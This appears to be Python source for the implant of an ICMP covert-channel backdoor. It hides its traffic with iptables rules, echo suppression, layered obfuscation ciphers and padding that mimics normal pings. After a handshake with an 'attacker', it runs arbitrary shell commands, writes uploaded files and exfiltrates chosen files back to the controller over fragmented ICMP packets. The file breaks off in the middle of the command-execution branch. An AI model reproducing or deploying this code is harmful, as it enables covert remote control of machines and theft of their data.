import socket
import struct
import select
import sys
import subprocess
import threading
import time
import argparse
import random
import datetime
import hashlib
import lzma
import base64
import os
import atexit
import ctypes
import signal
import uuid

is_echo = False

ICMP_ID = 0x1111
DEFAULT_SHIFT_VALUE = 1
DEFAULT_RAILFENCE_RAILS = 4
DEFAULT_BIT_RAILFENCE_RAILS = 7		# Set at >=2
HANDSHAKE_PREFIX = b"SYNC:"
ACK_PREFIX = b"ACK:"
PROBE_COMMAND = b"ALIVE"  
FRAGMENTATION_THRESHOLD = 48
PADDING_MIN = 1
PADDING_MAX = 5
REDUNDANCY_FACTOR = 0.1  
FRAG_TIMEOUT = 60  

TARGET_PAYLOAD_SIZE = 56
INNER_TARGET_SIZE = 30
FRAG_SIZE = 48
FRAG_START = b"FRAG_START:"
FRAG_PREFIX = b"FRAG:"
FRAG_START_ECHO = b'FS:'
FRAG_PREFIX_ECHO = b'F:'
FIXED_PADDING = bytes.fromhex('20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30 31 32 33 34 35 36 37')
FRAG_SIZE_ECHO = INNER_TARGET_SIZE - (4 + len(FRAG_PREFIX_ECHO) + 4)

firewall_marker = None

def apply_blocking_rules(family, rep_type):
    global firewall_marker
    firewall_marker = str(uuid.uuid4())[:12]

    if family == socket.AF_INET:
        cmd_base = ['iptables']
        proto = 'icmp'
        type_flag = '--icmp-type'
    else:
        cmd_base = ['ip6tables']
        proto = 'icmpv6'
        type_flag = '--icmpv6-type'

    subprocess.run(cmd_base + [
        '-A', 'OUTPUT',
        '-p', proto,
        type_flag, str(rep_type),
        '-m', 'owner', '--uid-owner', '0',
        '-m', 'comment', '--comment', firewall_marker,
        '-j', 'ACCEPT'
    ])

    subprocess.run(cmd_base + [
        '-A', 'OUTPUT',
        '-p', proto,
        type_flag, str(rep_type),
        '-m', 'comment', '--comment', firewall_marker,
        '-j', 'DROP'
    ])

def cleanup_blocking_rules(family, rep_type):
    global firewall_marker
    if not firewall_marker:
        return
    if family == socket.AF_INET:
        cmd_base = ['iptables']
    else:
        cmd_base = ['ip6tables']
    try:
        subprocess.run(cmd_base + [
            '-D', 'OUTPUT',
            '-p', 'icmp' if family == socket.AF_INET else 'icmpv6',
            '--icmp-type' if family == socket.AF_INET else '--icmpv6-type',
            str(rep_type),
            '-m', 'comment', '--comment', firewall_marker,
            '-j', 'ACCEPT'
        ], stderr=subprocess.DEVNULL)
        subprocess.run(cmd_base + [
            '-D', 'OUTPUT',
            '-p', 'icmp' if family == socket.AF_INET else 'icmpv6',
            '--icmp-type' if family == socket.AF_INET else '--icmpv6-type',
            str(rep_type),
            '-m', 'comment', '--comment', firewall_marker,
            '-j', 'DROP'
        ], stderr=subprocess.DEVNULL)
    except:
        pass

def suppress_icmp(family):
    ignore_file = '/proc/sys/net/ipv4/icmp_echo_ignore_all' if family == socket.AF_INET else '/proc/sys/net/ipv6/icmp/echo_ignore_all'
    with open(ignore_file, 'w') as f:
        f.write('1\n')
    return ignore_file

def unsuppress_icmp(ignore_file):
    with open(ignore_file, 'w') as f:
        f.write('0\n')

def checksum(source_string):
    sum_val = 0
    count_to = (len(source_string) // 2) * 2
    count = 0
    while count < count_to:
        this_val = (source_string[count] << 8) | source_string[count + 1]
        sum_val += this_val
        sum_val &= 0xffffffff
        count += 2
    if count_to < len(source_string):
        sum_val += (source_string[-1] << 8)
        sum_val &= 0xffffffff
    sum_val = (sum_val >> 16) + (sum_val & 0xffff)
    sum_val += sum_val >> 16
    answer = ~sum_val
    answer &= 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def checksum_v6(src, dst, data):
    src_bin = socket.inet_pton(socket.AF_INET6, src)
    dst_bin = socket.inet_pton(socket.AF_INET6, dst)
    length = struct.pack('!I', len(data))
    next_hdr = b'\x00\x00\x00\x3A'
    pseudo = src_bin + dst_bin + length + next_hdr
    full = pseudo + data
    return checksum(full)

def railfence_encrypt(data, rails):
    fence = [[] for _ in range(rails)]
    direction = 1
    row = 0
    for char in data:
        fence[row].append(char)
        row += direction
        if row == rails - 1 or row == 0:
            direction = -direction
    return b''.join(bytes(row) for row in fence)

def railfence_decrypt(data, rails):
    data_len = len(data)
    fence = [[] for _ in range(rails)]
    direction = 1
    row = 0
    for _ in range(data_len):
        fence[row].append(None)
        row += direction
        if row == rails - 1 or row == 0:
            direction = -direction
    idx = 0
    for r in range(rails):
        for c in range(len(fence[r])):
            fence[r][c] = data[idx]
            idx += 1
    result = []
    direction = 1
    row = 0
    for _ in range(data_len):
        result.append(fence[row].pop(0))
        row += direction
        if row == rails - 1 or row == 0:
            direction = -direction
    return b''.join(bytes([x]) for x in result)

def shift_encrypt(data, shift):
    return bytes((b + shift) % 256 for b in data)

def shift_decrypt(data, shift):
    return bytes((b - shift) % 256 for b in data)

def bit_railfence_encrypt(data, rails):
    bit_data = ''.join(f'{byte:08b}' for byte in data)
    fence = [[] for _ in range(rails)]
    direction = 1
    row = 0
    for bit in bit_data:
        fence[row].append(bit)
        row += direction
        if row == rails - 1 or row == 0:
            direction = -direction
    encrypted_bits = ''.join(''.join(row) for row in fence)
    return bytes(int(encrypted_bits[i:i+8], 2) for i in range(0, len(encrypted_bits), 8))

def bit_railfence_decrypt(data, rails):
    bit_data = ''.join(f'{byte:08b}' for byte in data)
    data_len = len(bit_data)
    fence = [[] for _ in range(rails)]
    direction = 1
    row = 0
    for _ in range(data_len):
        fence[row].append(None)
        row += direction
        if row == rails - 1 or row == 0:
            direction = -direction
    idx = 0
    for r in range(rails):
        for c in range(len(fence[r])):
            fence[r][c] = bit_data[idx]
            idx += 1
    result = []
    direction = 1
    row = 0
    for _ in range(data_len):
        result.append(fence[row].pop(0))
        row += direction
        if row == rails - 1 or row == 0:
            direction = -direction
    decrypted_bits = ''.join(result)
    return bytes(int(decrypted_bits[i:i+8], 2) for i in range(0, len(decrypted_bits), 8))

def generate_substitution_table(seed):
    random.seed(seed)
    table = list(range(256))
    random.shuffle(table)
    return table

def substitution_encrypt(data, table):
    return bytes(table[b] for b in data)

def substitution_decrypt(data, table):
    inverse_table = [0] * 256
    for i, v in enumerate(table):
        inverse_table[v] = i
    return bytes(inverse_table[b] for b in data)

def reverse_data(data):
    return data[::-1]

def generate_linux_mimic_padding(length, seed):
    random.seed(seed)
    padding = bytearray()
    while len(padding) < length:
        r = random.random()
        if r < 0.45:
            run_len = random.randint(6, 24)
            padding.extend(b'\x00' * run_len)
        elif r < 0.70:
            start = random.randint(0x08, 0x50)
            run_len = random.randint(8, 32)
            padding.extend(bytes(range(start, start + run_len)))
        elif r < 0.85:
            patterns = [
                b'0123456789' * 6,
                b'abcdefghijklmnopqrstuvwabcdefghi' * 2,
                struct.pack('!I', random.randint(0, 0xffffffff)) * random.randint(3, 6),
            ]
            pat = random.choice(patterns)
            padding.extend(pat[:random.randint(12, 36)])
        else:
            chunk = random.randbytes(random.randint(4, 12))
            chunk = bytes(b & 0x7F if random.random() < 0.8 else b for b in chunk)
            padding.extend(chunk)
    return bytes(padding[:length])

def layered_encrypt(data, padding_seed=None, sub_table=None, shift=DEFAULT_SHIFT_VALUE, railfence_rails=DEFAULT_RAILFENCE_RAILS, bit_rails=DEFAULT_BIT_RAILFENCE_RAILS, layers=None, selected_ops=None):
    pre_redun_len = len(data)
    redundancy_len = int(pre_redun_len * REDUNDANCY_FACTOR)
    redundancy = data[:redundancy_len]
    data += b'\x00' * (redundancy_len // 2) + redundancy
    post_redun_len = len(data)
    header = struct.pack('!II', pre_redun_len, post_redun_len)
    data = header + data
    pad_len = random.randint(PADDING_MIN, PADDING_MAX)
    random.seed(padding_seed if padding_seed is not None else 0)
    padding = bytes(random.randint(0, 255) for _ in range(pad_len))
    data += padding
    layer_funcs = {
        'reverse': reverse_data,
        'railfence': lambda d: railfence_encrypt(d, railfence_rails),
        'shift': lambda d: shift_encrypt(d, shift),
        'bit_railfence': lambda d: bit_railfence_encrypt(d, bit_rails),
        'sub': lambda d: substitution_encrypt(d, sub_table) if sub_table else d
    }
    for layer in layers or ['reverse', 'railfence', 'shift', 'bit_railfence', 'sub']:
        data = layer_funcs[layer](data)
    minor_funcs = {
        'flip': lambda d: bytes(b ^ (random.randint(0, 1) if random.random() < 0.1 else 0) for b in d),
        'xor': lambda d: bytes(b ^ (padding_seed % 256) for b in d),
        'noise': lambda d: d + random.randbytes(random.randint(1, 3)),
        'rotate': lambda d: d[-1:] + d[:-1]
    }
    for op in selected_ops or []:
        random.seed(padding_seed if padding_seed is not None else 0 + sum(map(ord, op)))
        if random.random() < 0.5:
            data = minor_funcs[op](data)
    data = struct.pack('!H', len(data)) + data
    if is_echo:
        pad_needed = TARGET_PAYLOAD_SIZE - len(data) - len(FIXED_PADDING)
        if pad_needed > 0:
            data += b'\x00' * pad_needed
        data += FIXED_PADDING
    else:
        current_len = len(data)
        min_pad = 8 if current_len <= 100 else 16
        max_pad = 24 if current_len <= 100 else 48
        mod_needed = (4 - current_len % 4) % 4
        possible_pads = [p for p in range(min_pad, max_pad + 1) if p % 4 == mod_needed]
        pad_len = random.choice(possible_pads) if possible_pads else min_pad
        mimic_seed = padding_seed ^ len(data) if padding_seed is not None else 0
        mimic = generate_linux_mimic_padding(pad_len, mimic_seed)
        data += mimic
    return data

def layered_decrypt(data, sub_table=None, shift=DEFAULT_SHIFT_VALUE, railfence_rails=DEFAULT_RAILFENCE_RAILS, bit_rails=DEFAULT_BIT_RAILFENCE_RAILS, layers=None, selected_ops=None, padding_seed=None):
    if len(data) < 2:
        return b''
    original_len = struct.unpack('!H', data[:2])[0]
    if len(data) < 2 + original_len:
        return b''
    data = data[2:2 + original_len]
    minor_inverse_funcs = {
        'flip': lambda d: bytes(b ^ (random.randint(0, 1) if random.random() < 0.1 else 0) for b in d),
        'xor': lambda d: bytes(b ^ (padding_seed % 256) for b in d),
        'noise': lambda d: d[:-random.randint(1, 3)] if len(d) > 3 else d,
        'rotate': lambda d: d[1:] + d[:1]
    }
    for op in reversed(selected_ops or []):
        random.seed(padding_seed if padding_seed is not None else 0 + sum(map(ord, op)))
        if random.random() < 0.5:
            data = minor_inverse_funcs[op](data)
    inverse_funcs = {
        'reverse': reverse_data,
        'railfence': lambda d: railfence_decrypt(d, railfence_rails),
        'shift': lambda d: shift_decrypt(d, shift),
        'bit_railfence': lambda d: bit_railfence_decrypt(d, bit_rails),
        'sub': lambda d: substitution_decrypt(d, sub_table) if sub_table else d
    }
    for layer in reversed(layers or ['reverse', 'railfence', 'shift', 'bit_railfence', 'sub']):
        data = inverse_funcs[layer](data)
    if len(data) < 8:
        return b''
    pre_redun_len, post_redun_len = struct.unpack('!II', data[:8])
    data = data[8:8 + post_redun_len]
    data = data[:pre_redun_len]
    return data

def light_encrypt(data, padding_seed=None, sub_table=None, shift=DEFAULT_SHIFT_VALUE, railfence_rails=DEFAULT_RAILFENCE_RAILS, bit_rails=DEFAULT_BIT_RAILFENCE_RAILS, layers=None, selected_ops=None):
    layer_funcs = {
        'reverse': reverse_data,
        'railfence': lambda d: railfence_encrypt(d, railfence_rails),
        'shift': lambda d: shift_encrypt(d, shift),
        'bit_railfence': lambda d: bit_railfence_encrypt(d, bit_rails),
        'sub': lambda d: substitution_encrypt(d, sub_table) if sub_table else d
    }
    for layer in layers or ['reverse', 'railfence', 'shift', 'bit_railfence', 'sub']:
        data = layer_funcs[layer](data)
    minor_funcs = {
        'flip': lambda d: bytes(b ^ (random.randint(0, 1) if random.random() < 0.1 else 0) for b in d),
        'xor': lambda d: bytes(b ^ (padding_seed % 256) for b in d),
        'rotate': lambda d: d[-1:] + d[:-1]
    }
    selected = [op for op in selected_ops or [] if op != 'noise']
    for op in selected:
        random.seed(padding_seed if padding_seed is not None else 0 + sum(map(ord, op)))
        if random.random() < 0.5:
            data = minor_funcs[op](data)
    data = struct.pack('!H', len(data)) + data
    if is_echo:
        pad_needed = TARGET_PAYLOAD_SIZE - len(data) - len(FIXED_PADDING)
        if pad_needed > 0:
            data += b'\x00' * pad_needed
        data += FIXED_PADDING
    else:
        current_len = len(data)
        min_pad = 8 if current_len <= 100 else 16
        max_pad = 24 if current_len <= 100 else 48
        mod_needed = (4 - current_len % 4) % 4
        possible_pads = [p for p in range(min_pad, max_pad + 1) if p % 4 == mod_needed]
        pad_len = random.choice(possible_pads) if possible_pads else min_pad
        mimic_seed = padding_seed ^ len(data) if padding_seed is not None else 0
        mimic = generate_linux_mimic_padding(pad_len, mimic_seed)
        data += mimic
    return data

def light_decrypt(data, sub_table=None, shift=DEFAULT_SHIFT_VALUE, railfence_rails=DEFAULT_RAILFENCE_RAILS, bit_rails=DEFAULT_BIT_RAILFENCE_RAILS, layers=None, selected_ops=None, padding_seed=None):
    if len(data) < 2:
        return b''
    original_len = struct.unpack('!H', data[:2])[0]
    if len(data) < 2 + original_len:
        return b''
    data = data[2:2 + original_len]
    selected = [op for op in selected_ops or [] if op != 'noise']
    minor_inverse_funcs = {
        'flip': lambda d: bytes(b ^ (random.randint(0, 1) if random.random() < 0.1 else 0) for b in d),
        'xor': lambda d: bytes(b ^ (padding_seed % 256) for b in d),
        'rotate': lambda d: d[1:] + d[:1]
    }
    for op in reversed(selected):
        random.seed(padding_seed if padding_seed is not None else 0 + sum(map(ord, op)))
        if random.random() < 0.5:
            data = minor_inverse_funcs[op](data)
    inverse_funcs = {
        'reverse': reverse_data,
        'railfence': lambda d: railfence_decrypt(d, railfence_rails),
        'shift': lambda d: shift_decrypt(d, shift),
        'bit_railfence': lambda d: bit_railfence_decrypt(d, bit_rails),
        'sub': lambda d: substitution_decrypt(d, sub_table) if sub_table else d
    }
    for layer in reversed(layers or ['reverse', 'railfence', 'shift', 'bit_railfence', 'sub']):
        data = inverse_funcs[layer](data)
    return data

def ms_since_midnight():
    now = datetime.datetime.now().time()
    return now.hour * 3600000 + now.minute * 60000 + now.second * 1000 + now.microsecond // 1000

def _get_base_dummy(icmp_type, icmp_id, icmp_sequence):
    if icmp_type in [0x11, 0x16]:
        return b''
    if icmp_type in [37, 38]:
        return b''
    if icmp_type in [13, 14]:
        ms = ms_since_midnight()
        orig = ms + random.randint(-5000, 5000)
        recv = orig + random.randint(0, 10000)
        trans = recv + random.randint(0, 1000)
        return struct.pack("!III", orig, recv, trans)
    elif icmp_type in [17, 18]:
        if icmp_type == 17:
            return b'\x00\x00\x00\x00'
        else:
            masks = [b'\xff\xff\xff\x00', b'\xff\xff\x00\x00', b'\xff\x00\x00\x00']
            return random.choice(masks)
    elif icmp_type == 10:
        return b'\x00\x00\x00\x00'
    elif icmp_type == 9:
        lifetime = random.randint(0, 65535).to_bytes(2, 'big')
        addr = b'\xc0\xa8' + random.randbytes(1) + random.randbytes(1)
        return b'\x01\x02' + lifetime + addr
    elif icmp_type in [128, 129]:
        return b''
    elif icmp_type == 133:
        return b'\x00\x00\x00\x00'
    elif icmp_type == 134:
        hop = random.choice([64, 255])
        flags = 0
        lifetime = random.randint(0, 65535)
        reachable = 0
        retrans = 0
        return struct.pack('!BBHII', hop, flags, lifetime, reachable, retrans)
    elif icmp_type in [135, 136]:
        if icmp_type == 135:
            res = b'\x00\x00\x00\x00'
        else:
            flags = random.choice([0, 1<<31, 1<<30, 1<<29, 3<<29])
            res = struct.pack('!I', flags)
        return res + random.randbytes(16)
    elif icmp_type in [130, 131]:
        if icmp_type == 130:
            return struct.pack("!HH", random.randint(100, 1000), 0) + random.randbytes(16)
        else:
            return struct.pack("!HH", 0, 1) + random.randbytes(16)
    elif icmp_type in [35, 36]:
        if icmp_type == 35:
            return b''
        else:
            return struct.pack('!BB', random.randint(0, 128), 0)
    elif icmp_type == 30:  
        id_num = random.randint(0, 65535)
        unused = 0
        out_hop = random.randint(1, 255)
        ret_hop = random.randint(1, 255)
        out_speed = random.randint(1000000, 1000000000)  
        out_mtu = random.randint(1500, 9000)
        return struct.pack('!HHHHI', id_num, unused, out_hop, ret_hop, out_speed) + struct.pack('!I', out_mtu)
    elif icmp_type == 40:  
        reserved = random.randbytes(4)
        return reserved
    elif icmp_type in [42, 43]:  
        flags = random.randint(0, 3)  
        if icmp_type == 42:
            return struct.pack('!HHH', icmp_id, icmp_sequence, flags)
        else:
            status = 0  
            return struct.pack('!HHHH', icmp_id, icmp_sequence, flags, status)
    else:
        return b''

def get_dummy_payload(icmp_type, icmp_id, seq, poly_seed=None, mutation_count=3):
    if poly_seed is not None:
        random.seed(poly_seed + seq)
        mode = random.randint(0, mutation_count - 1)
    else:
        mode = 0
    base_dummy = _get_base_dummy(icmp_type, icmp_id, seq)
    mutated_dummy = base_dummy
    if mode == 1:
        mutated_dummy = base_dummy[::-1]
    elif mode == 2:
        mutated_dummy = bytes((b ^ (seq & 0xFF)) for b in base_dummy)
    elif mode == 3:
        insert = random.randbytes(2)
        mutated_dummy = insert + base_dummy
    elif mode == 4:
        mutated_dummy = base_dummy + b'\x00' * random.randint(1, 4)
    pad_bytes = (4 - len(mutated_dummy) % 4) % 4
    if pad_bytes > 0:
        mutated_dummy += random.randbytes(pad_bytes)
    return mutated_dummy

def derive_prefixes(seed):
    hash_obj = hashlib.sha256(seed.encode())
    hash_digest = hash_obj.digest()
    cmd_prefix = hash_digest[:4]
    out_prefix = hash_digest[4:8]
    padding_seed = int.from_bytes(hash_digest[8:16], 'big')
    sub_seed = int.from_bytes(hash_digest[16:24], 'big')
    shift_value = hash_digest[24] % 128 + 1
    railfence_rails = (hash_digest[25] % 4) + 2
    bit_rails = (hash_digest[26] % 8) + 4
    sub_table = generate_substitution_table(sub_seed)
    poly_seed = int.from_bytes(hash_digest[27:31], 'big')
    mutation_count = (hash_digest[31] % 3) + 3
    delay_mode = ['uniform', 'exponential', 'gamma'][hash_digest[28] % 3]
    delay_min = (hash_digest[29] % 5) + 1
    delay_max = delay_min + (hash_digest[30] % 5) + 1
    layers = ['reverse', 'railfence', 'shift', 'bit_railfence', 'sub']
    random.seed(int.from_bytes(hash_digest[24:28], 'big'))
    random.shuffle(layers)
    minor_ops = ['flip', 'xor', 'noise', 'rotate']
    random.seed(int.from_bytes(hash_digest[29:33], 'big'))
    selected_ops = random.sample(minor_ops, k=random.randint(2, 3))
    return cmd_prefix, out_prefix, padding_seed, sub_table, shift_value, railfence_rails, bit_rails, poly_seed, mutation_count, delay_mode, delay_min, delay_max, layers, selected_ops

def get_local_ip(target, family):
    s = socket.socket(family, socket.SOCK_DGRAM)
    try:
        s.connect((target, 1))
        return s.getsockname()[0]
    except Exception:
        return '::1' if family == socket.AF_INET6 else '127.0.0.1'
    finally:
        s.close()

def compute_delay(delay_mode, delay_min, delay_max, rtt=None):
    if is_echo:
        return 1.0
    base = {
        'uniform': random.uniform(1.0, 1.8),
        'exponential': random.expovariate(1 / 1.4) + 0.8,
        'gamma': random.gammavariate(2, 0.4) + 1.0
    }[delay_mode]
    if rtt:
        base *= (1 + (rtt / 1000))
    base = min(max(base, 1.0), 1.8)
    jitter = base * random.uniform(-0.1, 0.1)
    return min(max(base + jitter, 1.0), 1.8)

def send_packet(controller_ip, rep_type, icmp_id, seq, payload, family, proto, poly_seed=None, mutation_count=3):
    icmp_code = 0
    icmp_checksum = 0
    dummy = get_dummy_payload(rep_type, icmp_id, seq, poly_seed, mutation_count)
    full_payload = dummy + payload
    source_ip = get_local_ip(controller_ip, family)
    header = struct.pack("!BBHHH", rep_type, icmp_code, icmp_checksum, icmp_id, seq)
    if family == socket.AF_INET6:
        icmp_checksum = checksum_v6(source_ip, controller_ip, header[0:2] + b'\x00\x00' + header[4:] + full_payload)
    else:
        icmp_checksum = checksum(header + full_payload)
    header = struct.pack("!BBHHH", rep_type, icmp_code, socket.htons(icmp_checksum), icmp_id, seq)
    packet = header + full_payload
    with socket.socket(family, socket.SOCK_RAW, proto) as sock:
        sock.sendto(packet, (controller_ip, 0) if family == socket.AF_INET else (controller_ip, 0, 0, 0))

def send_ack(controller_ip, rep_type, icmp_id, seq, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, poly_seed=None, mutation_count=3, delay_mode=None, delay_min=1, delay_max=3, layers=None, selected_ops=None):
    payload = ACK_PREFIX
    encrypted_payload = layered_encrypt(payload, padding_seed, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops)
    time.sleep(compute_delay(delay_mode, delay_min, delay_max))
    send_packet(controller_ip, rep_type, icmp_id, seq, encrypted_payload, family, proto, poly_seed, mutation_count)

def send_output(controller_ip, output, orig_seq, rep_type, icmp_id, out_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, is_file=False, poly_seed=None, mutation_count=3, delay_mode=None, delay_min=1, delay_max=3, layers=None, selected_ops=None):
    global frag_transfers
    actual_payload = out_prefix + output.encode('utf-8')

    force_frag = is_file
    pause_timer = time.time() if force_frag else None
    if force_frag or len(actual_payload) > FRAGMENTATION_THRESHOLD:
        data = actual_payload[len(out_prefix):]
        data = lzma.compress(data) if is_file else data
        encrypted_data = layered_encrypt(data, padding_seed, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops)
        if is_echo and len(encrypted_data) % FRAG_SIZE_ECHO != 0:
            pad_needed = FRAG_SIZE_ECHO - (len(encrypted_data) % FRAG_SIZE_ECHO)
            encrypted_data += b'\x00' * pad_needed
        overall_hash = hashlib.sha256(encrypted_data).digest()
        if is_echo:
            overall_hash = overall_hash[:16]
        frags = []
        i = 0
        frag_size_val = FRAG_SIZE_ECHO if is_echo else FRAG_SIZE
        while i < len(encrypted_data):
            frag_size = frag_size_val if is_echo else frag_size_val + random.randint(-10, 10)
            frag_size = max(1, min(frag_size, len(encrypted_data) - i))
            frags.append(encrypted_data[i:i+frag_size])
            i += frag_size
        total_frags = len(frags)
        frag_id = random.randbytes(4 if not is_echo else 2)

        init_payload = out_prefix + (FRAG_START_ECHO if is_echo else FRAG_START) + struct.pack('!2sH16s' if is_echo else '!4sI32s', frag_id, total_frags, overall_hash)
        encrypted_init = light_encrypt(init_payload, padding_seed, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops)
        time.sleep(compute_delay(delay_mode, delay_min, delay_max))
        send_packet(controller_ip, rep_type, icmp_id, orig_seq, encrypted_init, family, proto, poly_seed, mutation_count)

        frags_with_num = list(enumerate(frags))
        random.seed(padding_seed + len(data))
        random.shuffle(frags_with_num)
        frag_transfers[frag_id] = {
            'frags': frags_with_num,
            'sent': 0,
            'last_sent': time.time()
        }

        if force_frag and time.time() - pause_timer > 900:
            pause_dur = random.uniform(60, 180)
            time.sleep(pause_dur)
            pause_timer = time.time()
    else:
        encrypted_payload = layered_encrypt(actual_payload, padding_seed, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops)
        time.sleep(compute_delay(delay_mode, delay_min, delay_max))
        send_packet(controller_ip, rep_type, icmp_id, orig_seq, encrypted_payload, family, proto, poly_seed, mutation_count)

def receive_commands(req_type, rep_type, icmp_id, family, proto, local_ip):
    global frag_transfers
    handshake_done = False
    cmd_prefix = None
    out_prefix = None
    padding_seed = None
    sub_table = None
    shift = DEFAULT_SHIFT_VALUE
    railfence_rails = DEFAULT_RAILFENCE_RAILS
    bit_rails = DEFAULT_BIT_RAILFENCE_RAILS
    poly_seed = None
    mutation_count = 3
    delay_mode = None
    delay_min = 1
    delay_max = 3
    layers = None
    selected_ops = None
    controller_ip = None
    frag_transfers = {}
    frag_buffers = {}
    with socket.socket(family, socket.SOCK_RAW, proto) as sock:
        while True:
            ready = select.select([sock], [], [], 1)
            if ready[0]:
                data, addr = sock.recvfrom(2048)
                if addr[0] == local_ip:
                    continue
                if len(data) < 20:
                    continue
                ihl = (data[0] & 0xF) * 4 if family == socket.AF_INET else 40
                if len(data) < ihl + 8:
                    continue
                icmp_header = data[ihl:ihl+8]
                icmp_type, icmp_code, icmp_checksum, pkt_id, pkt_seq = struct.unpack("!BBHHH", icmp_header)
                reconstructed_header = struct.pack("!BBHHH", icmp_type, icmp_code, 0, pkt_id, pkt_seq)
                full_payload = data[ihl+8:]
                if family == socket.AF_INET6:
                    calc_checksum = checksum_v6(addr[0], local_ip, reconstructed_header + full_payload)
                else:
                    calc_checksum = checksum(reconstructed_header + full_payload)
                if socket.ntohs(icmp_checksum) != calc_checksum:
                    continue
                if icmp_type == req_type and pkt_id == icmp_id:
                    skip_bytes = len(get_dummy_payload(icmp_type, pkt_id, pkt_seq, poly_seed, mutation_count))
                    encrypted_payload = full_payload[skip_bytes:]
                    payload = layered_decrypt(encrypted_payload, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops, padding_seed=padding_seed)
                    if not handshake_done:
                        if payload.startswith(HANDSHAKE_PREFIX):
                            seed = payload[len(HANDSHAKE_PREFIX):].decode('utf-8', errors='ignore').strip()
                            cmd_prefix, out_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, poly_seed, mutation_count, delay_mode, delay_min, delay_max, layers, selected_ops = derive_prefixes(seed)
                            controller_ip = addr[0]
                            send_ack(addr[0], rep_type, icmp_id, pkt_seq, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, poly_seed, mutation_count, delay_mode, delay_min, delay_max, layers, selected_ops)
                            handshake_done = True
                            print(f"Handshake complete with attacker {addr[0]}")
                    else:
                        if not payload.startswith(cmd_prefix):
                            payload = light_decrypt(encrypted_payload, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops, padding_seed=padding_seed)
                        if payload.startswith(cmd_prefix):
                            rest = payload[len(cmd_prefix):]
                            frag_start_val = FRAG_START_ECHO if is_echo else FRAG_START
                            frag_prefix_val = FRAG_PREFIX_ECHO if is_echo else FRAG_PREFIX
                            if rest.startswith(frag_start_val):
                                unpack_fmt = '!2sH16s' if is_echo else '!4sI32s'
                                unpack_len = 20 if is_echo else 40
                                if len(rest) < len(frag_start_val) + unpack_len:
                                    continue
                                frag_id, total_frags, overall_hash = struct.unpack(unpack_fmt, rest[len(frag_start_val):len(frag_start_val)+unpack_len])
                                frag_buffers[frag_id] = {'frags': {}, 'total': total_frags, 'hash': overall_hash, 'ts': time.time()}
                            elif rest.startswith(frag_prefix_val):
                                unpack_fmt = '!2sH' if is_echo else '!4sI'
                                unpack_len = 4 if is_echo else 8
                                if len(rest) < len(frag_prefix_val) + unpack_len:
                                    continue
                                frag_id, num = struct.unpack(unpack_fmt, rest[len(frag_prefix_val):len(frag_prefix_val)+unpack_len])
                                frag_data = rest[len(frag_prefix_val)+unpack_len:]
                                if frag_id in frag_buffers:
                                    buf = frag_buffers[frag_id]
                                    if time.time() - buf['ts'] > FRAG_TIMEOUT:
                                        del frag_buffers[frag_id]
                                        continue
                                    buf['frags'][num] = frag_data
                                    buf['ts'] = time.time()
                                    if len(buf['frags']) == buf['total']:
                                        assembled_encrypted = b''.join(buf['frags'].get(i, b'') for i in range(buf['total']))
                                        hash_check = hashlib.sha256(assembled_encrypted).digest()[:16] if is_echo else hashlib.sha256(assembled_encrypted).digest()
                                        if hash_check == buf['hash']:
                                            assembled = layered_decrypt(assembled_encrypted, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops, padding_seed=padding_seed)
                                            try:
                                                assembled = lzma.decompress(assembled)
                                            except lzma.LZMAError:
                                                pass
                                            command = assembled.decode('utf-8', errors='ignore').strip()
                                            if command.startswith("upload "):
                                                parts = command.split(" ", 1)[1].strip().split(" ", 1)
                                                target_path = parts[0]
                                                if len(parts) > 1 and ':' in parts[1]:
                                                    filename, encoded_data = parts[1].split(":", 1)
                                                    try:
                                                        compressed_data = base64.b64decode(encoded_data)
                                                        file_data = lzma.decompress(compressed_data)
                                                        with open(os.path.join(target_path, filename), 'wb') as f:
                                                            f.write(file_data)
                                                        output = f"UPLOAD_SUCCESS: {filename} uploaded to {target_path}"
                                                    except Exception as e:
                                                        output = f"UPLOAD_ERROR: {str(e)}"
                                                    send_output(addr[0], output, pkt_seq, rep_type, icmp_id, out_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, is_file=True, poly_seed=poly_seed, mutation_count=mutation_count, delay_mode=delay_mode, delay_min=delay_min, delay_max=delay_max, layers=layers, selected_ops=selected_ops)
                                                else:
                                                    send_output(addr[0], "UPLOAD_ERROR: Invalid format", pkt_seq, rep_type, icmp_id, out_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, poly_seed=poly_seed, mutation_count=mutation_count, delay_mode=delay_mode, delay_min=delay_min, delay_max=delay_max, layers=layers, selected_ops=selected_ops)
                                            elif command.startswith("exfil "):
                                                file_path = command.split(" ", 1)[1].strip()
                                                try:
                                                    with open(file_path, 'rb') as f:
                                                        file_data = f.read()
                                                    compressed_data = lzma.compress(file_data)
                                                    encoded_data = base64.b64encode(compressed_data).decode('utf-8')
                                                    output = f"EXFIL_START:{os.path.basename(file_path)}:{encoded_data}"
                                                    send_output(addr[0], output, pkt_seq, rep_type, icmp_id, out_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, is_file=True, poly_seed=poly_seed, mutation_count=mutation_count, delay_mode=delay_mode, delay_min=delay_min, delay_max=delay_max, layers=layers, selected_ops=selected_ops)
                                                except Exception as e:
                                                    send_output(addr[0], f"EXFIL_ERROR:{str(e)}", pkt_seq, rep_type, icmp_id, out_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, is_file=True, poly_seed=poly_seed, mutation_count=mutation_count, delay_mode=delay_mode, delay_min=delay_min, delay_max=delay_max, layers=layers, selected_ops=selected_ops)
                                            else:
                                                print(f"Executing: {command}")
                                                try:
                                                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                                                    output = result.decode('utf-8', errors='ignore')
                                                except Exception as e:
                                                    output = str(e)
